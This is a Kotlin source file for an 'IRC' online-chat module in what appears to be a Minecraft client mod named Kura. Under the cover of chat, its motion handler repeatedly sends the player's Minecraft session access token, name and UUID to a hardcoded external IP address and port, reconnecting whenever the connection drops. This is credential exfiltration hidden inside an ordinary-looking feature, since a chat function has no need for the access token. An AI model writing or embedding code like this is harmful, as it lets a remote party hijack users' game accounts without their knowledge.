package dev.dyzjct.kura.module.modules.client

import dev.dyzjct.kura.Kura
import dev.dyzjct.kura.module.Category
import dev.dyzjct.kura.module.Module
import dev.dyzjct.kura.utils.TimerUtils
import helper.kura.socket.packet.GameInfoPacket

object IRC : Module(
    name = "IRC",
    langName = "在线聊天",
    category = Category.CLIENT,
    safeModule = true
) {
    val mode by msetting("NoticeMode", Mode.Chat)

    private val reloadTimer = TimerUtils()

    override fun onDisable() {
        if (Kura.ircSocket.client.isConnected) {
            Kura.ircSocket.client.disconnect()
        }
    }

    init {
        onMotion {
            if (Kura.ircSocket.client.isConnected) {
                Kura.ircSocket.send(
                    GameInfoPacket(
                        player.name.string,
                        mc.getSession().accessToken,
                        mc.getSession().uuid,
                        System.currentTimeMillis()
                    )
                )
            } else if (!Kura.ircSocket.client.isConnecting) {
                Kura.ircSocket.client.start("154.9.27.109", 45600)
            }
        }
    }

    enum class Mode {
        Notification, Chat, Both
    }
}